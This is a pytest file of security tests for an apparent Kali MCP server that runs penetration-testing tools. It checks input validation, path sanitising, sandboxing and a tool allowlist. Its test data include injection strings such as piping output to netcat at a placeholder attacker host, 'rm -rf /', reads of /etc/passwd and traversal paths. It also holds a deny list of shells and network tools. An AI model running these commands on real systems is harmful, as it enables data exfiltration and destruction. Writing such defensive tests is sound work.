"""Security-focused tests for the Kali MCP server."""

import os
import tempfile
from pathlib import Path
from unittest import mock

import pytest

import server


class TestSecurityValidation:
    """Test security validation functions."""
    
    def test_tool_name_validation(self):
        """Test that tool names are properly validated."""
        # Valid tool names
        valid_names = ["nmap", "sqlmap", "hydra", "john", "test-tool", "tool_123"]
        for name in valid_names:
            assert server.validate_tool_access(name) or name not in server.config.allowed_tools
    
    def test_tool_name_injection_attempts(self):
        """Test that tool name injection attempts are blocked."""
        malicious_names = [
            "nmap; rm -rf /",
            "nmap && cat /etc/passwd",
            "nmap | nc attacker.com 4444",
            "nmap`whoami`",
            "nmap$(id)",
            "nmap || echo pwned",
            "nmap > /tmp/pwned",
            "nmap < /etc/passwd",
            "nmap(nmap)",
            "nmap{nmap}",
            "nmap[nmap]",
            "nmap nmap",
            "nmap\tnmap",
            "nmap\nnmap",
            "nmap\rnmap",
        ]
        
        for name in malicious_names:
            # These should either be rejected by validation or not in allowed tools
            assert not server.validate_tool_access(name)
    
    def test_args_validation(self):
        """Test that command arguments are properly validated."""
        from server import ToolExecutionRequest
        
        # Valid arguments
        valid_args = ["-V", "--version", "-sS -O", "192.168.1.1", "target.com"]
        for args in valid_args:
            request = ToolExecutionRequest(tool="nmap", args=args)
            assert request.args == args
        
        # Invalid arguments (should raise validation error)
        invalid_args = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test`whoami`",
            "test$(id)",
            "test || echo pwned",
            "test > /tmp/pwned",
            "test < /etc/passwd",
            "test(test)",
            "test{test}",
            "test[test]",
        ]
        
        for args in invalid_args:
            with pytest.raises(ValueError, match="potentially dangerous characters"):
                ToolExecutionRequest(tool="nmap", args=args)
    
    def test_path_sanitization(self):
        """Test path sanitization functionality."""
        # Normal paths should be preserved
        normal_paths = [
            "/tmp/test",
            "/opt/kalimcp",
            "/home/user",
            "relative/path"
        ]
        
        for path in normal_paths:
            sanitized = server.sanitize_path(path)
            assert ".." not in sanitized
            assert "//" not in sanitized
        
        # Malicious paths should be sanitized
        malicious_paths = [
            "../../../etc/passwd",
            "//etc//passwd",
            "/tmp/../../../etc/passwd",
            "/tmp//test",
            "....//....//....//etc//passwd"
        ]
        
        for path in malicious_paths:
            sanitized = server.sanitize_path(path)
            assert ".." not in sanitized
            assert "//" not in sanitized
            assert "etc/passwd" not in sanitized
    
    def test_sandbox_environment(self):
        """Test sandbox environment creation."""
        env = server.create_sandbox_environment("/tmp/test")
        
        # Dangerous environment variables should be removed or neutralized
        dangerous_vars = [
            "LD_PRELOAD",
            "LD_LIBRARY_PATH",
            "PYTHONPATH",
            "PERL5LIB",
            "RUBYLIB",
            "NODE_PATH"
        ]
        
        for var in dangerous_vars:
            if var in env:
                assert env[var] == "" or env[var] is None
        
        # Working directory should be set correctly
        assert env["PWD"] == "/tmp/test"
        
        # Essential variables should be preserved
        essential_vars = ["PATH", "HOME", "USER", "SHELL", "LANG", "LC_ALL"]
        for var in essential_vars:
            if var in os.environ:
                assert var in env


class TestToolExecutionSecurity:
    """Test security aspects of tool execution."""
    
    def test_tool_whitelist_enforcement(self):
        """Test that only whitelisted tools can be executed."""
        # Tools not in the whitelist should be rejected
        dangerous_tools = [
            "rm", "rmdir", "del", "format", "fdisk", "mkfs",
            "dd", "shred", "wipe", "srm", "sdelete",
            "wget", "curl", "nc", "netcat", "socat",
            "bash", "sh", "csh", "zsh", "fish",
            "python", "perl", "ruby", "node", "php",
            "sudo", "su", "chmod", "chown", "chgrp",
            "mount", "umount", "fdisk", "parted",
            "iptables", "ufw", "firewall-cmd",
            "systemctl", "service", "initctl",
            "crontab", "at", "batch",
            "passwd", "useradd", "userdel", "usermod",
            "groupadd", "groupdel", "groupmod",
            "visudo", "vipw", "vigr"
        ]
        
        for tool in dangerous_tools:
            if tool not in server.config.allowed_tools:
                assert not server.validate_tool_access(tool)
    
    def test_timeout_enforcement(self):
        """Test that timeouts are properly enforced."""
        # Test that timeout cannot exceed maximum
        with pytest.raises(ValueError, match="exceeds maximum allowed"):
            server.run_tool("nmap", "-V", timeout=999999)
    
    def test_output_size_limiting(self):
        """Test that output size is limited."""
        # This would be tested with a tool that produces large output
        # For now, we test the configuration
        assert server.config.max_output_size > 0
        assert server.config.max_output_size < 100 * 1024 * 1024  # Less than 100MB


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_tool_name_regex_validation(self):
        """Test that tool names match the expected regex pattern."""
        from server import ToolExecutionRequest
        
        # Valid tool names
        valid_names = ["nmap", "sqlmap", "hydra", "test-tool", "tool_123", "a"]
        for name in valid_names:
            request = ToolExecutionRequest(tool=name)
            assert request.tool == name
        
        # Invalid tool names
        invalid_names = [
            "tool with spaces",
            "tool;with;semicolons",
            "tool|with|pipes",
            "tool&with&amps",
            "tool`with`backticks",
            "tool$with$dollars",
            "tool(with)parens",
            "tool<with>angles",
            "tool[with]brackets",
            "tool{with}braces",
            "tool with\ttabs",
            "tool with\nnewlines",
            "tool with\rcarriage",
            "tool/with/slashes",
            "tool\\with\\backslashes",
            "tool:with:colons",
            "tool=with=equals",
            "tool+with+pluses",
            "tool*with*asterisks",
            "tool?with?questions",
            "tool!with!exclamations",
            "tool@with@ats",
            "tool#with#hashes",
            "tool%with%percents",
            "tool^with^carets",
            "tool~with~tildes",
            "tool\"with\"quotes",
            "tool'with'apostrophes",
        ]
        
        for name in invalid_names:
            with pytest.raises(ValueError, match="contains invalid characters"):
                ToolExecutionRequest(tool=name)
    
    def test_working_directory_validation(self):
        """Test working directory validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Valid working directory
            valid_dir = os.path.join(temp_dir, "valid")
            os.makedirs(valid_dir, exist_ok=True)
            
            with patch('server.validate_tool_access', return_value=True):
                with patch('server.subprocess.run') as mock_run:
                    mock_run.return_value.stdout = "test"
                    mock_run.return_value.stderr = ""
                    mock_run.return_value.returncode = 0
                    
                    # Should work with valid directory
                    server.run_tool("nmap", "-V", working_dir=valid_dir)
                    mock_run.assert_called_once()
            
            # Test with directory traversal attempt
            malicious_dir = os.path.join(temp_dir, "..", "..", "etc")
            sanitized_dir = server.sanitize_path(malicious_dir)
            assert ".." not in sanitized_dir


class TestResourceLimits:
    """Test resource limiting and protection."""
    
    def test_memory_usage_protection(self):
        """Test that memory usage is limited."""
        # This would require a tool that uses a lot of memory
        # For now, we test the configuration
        assert server.config.max_output_size > 0
        assert server.config.max_output_size < 100 * 1024 * 1024  # Less than 100MB
    
    def test_cpu_time_limiting(self):
        """Test that CPU time is limited through timeouts."""
        # Test that timeout is enforced
        assert server.config.max_timeout > 0
        assert server.config.max_timeout < 3600  # Less than 1 hour
    
    def test_file_system_protection(self):
        """Test that file system access is restricted."""
        # Test that working directory is restricted
        assert server.config.working_directory is not None
        assert server.config.working_directory.startswith("/")
        
        # Test that sandbox environment restricts dangerous variables
        env = server.create_sandbox_environment("/tmp/test")
        assert "LD_PRELOAD" not in env or env["LD_PRELOAD"] == ""


class TestLoggingSecurity:
    """Test security aspects of logging."""
    
    def test_sensitive_data_not_logged(self):
        """Test that sensitive data is not logged."""
        # This would require checking log output for sensitive information
        # For now, we ensure logging is configured
        assert server.logger is not None
        assert server.logger.level <= server.logging.INFO
    
    def test_security_events_logged(self):
        """Test that security events are logged."""
        # Test that security errors are logged
        with patch('server.logger.warning') as mock_warning:
            with patch('server.validate_tool_access', return_value=False):
                try:
                    server.run_tool("rm", "test")
                except server.SecurityError:
                    pass
                # Security error should be logged
                mock_warning.assert_called()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
